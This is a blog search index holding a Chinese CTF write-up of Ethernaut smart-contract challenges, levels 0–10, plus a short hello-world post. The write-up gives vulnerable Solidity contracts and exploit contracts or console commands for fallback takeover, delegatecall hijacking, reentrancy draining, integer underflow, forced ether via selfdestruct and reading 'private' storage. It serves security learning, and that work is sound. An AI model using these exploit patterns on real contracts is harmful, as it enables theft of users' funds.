<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Ethernaut训练]]></title>
    <url>%2F2019%2F01%2F08%2Fethernautd%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接 level 0 - Hello Ethernaut题目链接 第一步首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络 第二步打开控制台，然后会发现给了合约地址和help 其中level地址为 0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c在Ropsten测试网络下还会有你的player地址和Ethernaut地址使用player指令可以直接获得player地址 第三步之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7 第四步使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的公共方法列表，当然在下面可以看见例如owner: f()之类的东西就是方法的具体信息 第五步与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用ethernaut.owner()，返回的是智能合约的拥有者 第六步这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至中文，然后点击存入-测试水管，之后点击request 1 ether from faucet就行 第七步生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间 成功之后会显示下图 第八步题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用contract.方法就行 第九步从contract.info()入手跟着走下去就行 之后点击submit instance即可过关。 通关后的彩蛋 Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.You are now ready to complete all the levels of the game, and as of now, you’re on your own.Godspeed!! level 1 - Fallback题目链接 胜利条件1.获得合约的所有权2.收回合约的所有余额 tips1.如何用ABI发送ether2.如何用ABI以外的方法发送ether3.查看help()会有帮助4.Fallback方法 源码123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; //构造函数，初始化owner的contributions为1000 contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; //将合约拥有权交给贡献1000ETH以上的人 require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; //查询contribution return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用 owner.transfer(this.balance); &#125; function() payable public &#123; //fallback函数，当满足发送的value大于1并且发送者的contributions的值大于1时将owner变为消息发送者 require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 预备知识回退函数(fallback function)1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。 2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。 我们在这里要用到的就是第二点 解题思路最终目的是调用withdraw()方法将余额清零，也就是我们要成为ownercontribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）在fallback中只要满足msg.value&gt;0且contributions[msg.sender]&gt;0即可成为owner其中msg.value我们可以直接发送过去，而contributions[msg.sender]我们需要调用contribute()这个函数，也就是参数满足value&lt;0.001的条件就行 具体步骤1.调用contribute函数，传入参数value=1其中value的单位是wei 11 eth = 1e9 Gwei = 1e18 wei 2.调用send函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用contract.sendTransaction({value: 100}))， 由于send函数会调用fallback函数，我们便成为了owner 3.调用withdraw函数，将钱卷走 4.点击submit instance即可过关。 注意事项绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号(:зゝ∠) 通关后的彩蛋 You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.Move on to the next level when you’re ready! level 2 - Fallout题目链接 胜利条件1.获得合约的所有权 tips1.Solidity Remix IDE 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 解题思路可以看出函数的构造函数写错了，Fallout写成了Fal1out，变为了谁都可以调用的函数(我们无法调用构造函数)。所以我们可以调用构造函数成为owner，然后再调用collectAllocations取钱 具体步骤1.调用Fal1out函数，成为owner 2.调用collectAllocations函数，将钱卷走 3.点击submit instance即可过关。 通关后的彩蛋 That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?Well… Not quite.The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:12345&gt; contract Rubixi &#123;&gt; address private owner;&gt; function DynamicPyramid() &#123; owner = msg.sender; &#125;&gt; function collectAllFees() &#123; owner.transfer(this.balance) &#125;&gt; ... This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland. level 3 - Coin Flip题目链接 胜利条件1.猜抛硬币的结果，连续猜对十次即可获胜 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; 预备知识1.revert()这行代码：if(msg.sender != owner) { throw; }完全等价于如下三种形式：if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner); 解题思路1.从随机数逻辑生成来看，主要有三个步骤&nbsp;&nbsp;&nbsp;&nbsp;a.获取上一个块的hash&nbsp;&nbsp;&nbsp;&nbsp;b.判断hash是否和上一次的hash相同，相同则回退&nbsp;&nbsp;&nbsp;&nbsp;c.根据blockValue/FACTOR的结果判断硬币正负 2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可 具体步骤1.编写exp合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract exp&#123; CoinFlip C; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 function setCoinflip(address _addr) public &#123; C = CoinFlip(_addr); &#125; function hack() public OwnerOnly &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; C.flip(side); &#125;&#125; 2.部署在remix上并运行hack方法十次 3.通过命令contract.consecutiveWins()可查询猜对的次数 4.当猜对的次数为10次以上之后，点击submit instance即可过关。 通关后的彩蛋 Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor. Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize). level 4- Telephone题目链接 胜利条件1.获得合约的所有权 tips1.See the Help page above, section &quot;Beyond the console&quot;,这一节主要就是教你可以使用Remix和Truffle进行合约编写和attack，也就是我们所说的写exp并运行。 源码12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 预备知识1.tx.origin 全局变量，也就是合约的owner 解题思路1.我们可以编写代码调用changeOwner，传入我们的地址，就可以变成合约owner了 具体步骤1.编写exp合约123456789101112131415161718192021222324252627pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract exp&#123; Telephone tel; function setAttackAddr(address _addr)&#123; tel = Telephone(_addr); &#125; function attack(address _addr)&#123; tel.changeOwner(_addr); &#125;&#125; 2.获取合约地址和我们自己的用户地址，并查询合约拥有者 3.进行攻击 4.再次查询合约拥有者，发现变成了我们，攻击完毕 5.点击submit instance即可过关。 通关后的彩蛋 While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.An example of a possible attack is outlined below.1.Use tx.origin to determine whose tokens to transfer, e.g.1234&gt; function transfer(address _to, uint _value) &#123;&gt; tokens[tx.origin] -= _value;&gt; tokens[_to] += _value;&gt; &#125; 2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.123&gt; function () payable &#123;&gt; token.transfer(attackerAddress, 10000);&gt; &#125; In this scenario, tx.origin will be the victim’s address (while msg.sender will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker. level 5- Token题目链接 胜利条件1.攻击Token代币合约2.开始时会获取20个代币，我们需要获得额外的、大量的代币 tips1.odometer 源码12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; //初始化代币给owner balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于0 require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量 return balances[_owner]; &#125;&#125; 解题思路1.从transfer函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可 具体步骤1.初始化信息 2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出 3.点击submit instance即可过关。 通关后的彩蛋 Overflows are very common in solidity and must be checked for with control statements such as:123&gt; if(a + c &gt; a) &#123;&gt; a = a + c;&gt; &#125; An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:1&gt; a = a.add(c); If there is an overflow, the code will revert. level 6- Delegation题目链接 胜利条件1.获得合约的所有权 tips1.查看Solidity文档中关于delegatecall low level function的内容2.Fallback方法3.Method ids 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; //初始化 delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; //FallBack函数 if(delegate.delegatecall(msg.data)) &#123; //执行参数为data的delegatecall this; &#125; &#125;&#125; 预备知识1.delegatecall简单来说就是delegatecall执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过delegatecall调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)具体内容可以参考这篇文章，写的挺详细的链接 解题思路1.首先我们的目的是通过delegatecall来执行Delegate合约中的pwn方法，进而通过delegatecall的漏洞来改变Delegation合约的owner，也就是改成我们。2.为了执行delegatecall，我们需要执行fallback函数，传入的data参数应该为pwn()的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位) 具体步骤1.初始化实例并查看合约的owner 2.构造exp并执行contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)}).完毕之后查看owner，发现已经变成我们 3.点击submit instance即可过关。 通关后的彩蛋 Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care. Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD. level 7- Force题目链接 胜利条件1.让合约的balance&gt;0 tips1.Fallback方法2.用其他合约去攻击这个合约3.用Remix或Truffle 源码1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)*/&#125; 预备知识1.selfdestruct函数(析构函数)selfdestruct(address)会将当前合约的余额发送至address。 2.没有fallback函数如何往合约里打钱？当合约没有实现payable fallback函数的时候，依然有两种方法给合约里打钱&nbsp;&nbsp;&nbsp;&nbsp;a.将合约作为挖矿地址挖矿&nbsp;&nbsp;&nbsp;&nbsp;b.调用其他合约的析构函数selfdestruct并将此合约的地址作为参数 解题思路1.我们自己编写一个合约并约束一个方法为payable，并通过该方法向此合约中打钱。2.调用此合约的selfdestruct函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。 具体步骤1.编写exp合约12345678910contract exp&#123; address attackAddr; function init(address _addr) public payable&#123; attackAddr=_addr; &#125; function attack()&#123; selfdestruct(attackAddr); &#125;&#125; 2.先调用init函数设置攻击合约的地址，并附加上一定数额的ETH 3.再调用attack函数进行转钱 3.点击submit instance即可过关。 通关后的彩蛋 In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant this.balance == 0 for any contract logic. level 8- Vault题目链接 胜利条件1.获得password并调用unlock函数使得locked参数变为false 源码1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 预备知识1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了private，该信息依然是公开的，可以随时被别人查看。 解题思路1.通过读取区块链上的块中的信息获取password2.用该password作为参数调用unlock函数进行解锁 具体步骤1.通过web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))指令查看password 2.将password传入unlock函数 3.点击submit instance即可过关。 通关后的彩蛋 It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. level 9- King题目链接 胜利条件1.你可以通过打钱成为新的King，当然前提是你的前比上一个King的钱多2.当你点击Submit的时候合约会重新变为King，你要想办法去保持King位 源码123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; //打更多的钱或者合约owner都可以调用此方法变为king require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; 预备知识1.Solidity 中几种转币方式。 &lt;address&gt;.transfer()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会 throw; 回滚状态&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.send()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.call.value()()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;传递所有可用 Gas 供调用，不能有效防止重入（reentrancy） 解题思路1.由于最后合约owner会调用fallback函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止transfer2.我们可以自己写个合约并将fallback函数设为revert()，这样就没有人可以通过transfer()打钱给我们。当然我们甚至可以不写fallback函数也可以实现这个效果 具体步骤1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了)12345678pragma solidity ^0.4.18;contract exp &#123; function exp() public payable &#123; address attackAddr = 0x529c6e4d28d24af49eada89a2f7effa44c8f58c3; attackAddr.call.gas(1000000).value(msg.value)(); &#125;&#125; 2.部署合约，注意要传入比原先的1ETH多 3.查看king可以发现king已经变成了我们部署的合约的地址 4.点击submit instance即可过关。 通关后的彩蛋 Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.In this case, see: King of the Ether and King of the Ether Postmortem level 10- Re-entrancy题目链接 胜利条件1.将合约中的所有钱卷走 tips1.不可信的合约可以执行人们不希望出现的代码2.Fallback方法3.Throw/revert bubbling4.用其他合约去攻击这个合约5.用Remix或Truffle 源码12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; 解题思路这是一个比较著名的重入漏洞，漏洞点在withdraw，它会先判断账户是否有那么多余额在调用call进行转账，然后再将balances中的金额减少。但是我们前面说过call过去的地址如果是个合约地址，并且合约的fallback函数也调用了withdraw函数，那么这就会成为一个递归问题，一直到gas=0才会停止。div style=”width: 50%; margin: auto”&gt;所以我们可以利用这个机制编写合约将钱全部提出。 具体步骤1.编写exp合约12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract exp &#123; address instance_address = 0xdc8941b8396a3140b008d124fcd149acd2005eff; Reentrance target = Reentrance(instance_address); function exp() payable&#123;&#125; function donate() public payable &#123; target.donate.value(msg.value)(this); &#125; function attack() public &#123; //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125; function get_balance() public view returns(uint) &#123; return target.balanceOf(this); &#125; function my_eth_bal() public view returns(uint) &#123; return address(this).balance; &#125; function ins_eth_bal() public view returns(uint) &#123; return instance_address.balance; &#125; function () public payable &#123; //同理写两次 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125;&#125; 2.调用donate方法捐款2ETH 3.调用attack方法进行攻击，可以看见钱全部在我们这里并且整数溢出了 攻击后的结果 4.点击submit instance即可过关。 通关后的彩蛋 Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don’t interrupt the execution flow when the receiving contract fails.Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.Re-entrancy is a common attack. You should always be prepared for it! The DAO HackThe famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F01%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Start这个博客主要用来记录一些有关ctf的知识因为自己太健忘了，不记录下会出事的而且搭个博客以后AWD就不用再坐着发呆了，起码有点东西可以看本博客主要分为web和crypto两个方向，也是我现在负责的两个方向希望自己多多加油吧！最后来个常规操作 1$ ehco "Hello world"]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
</search>
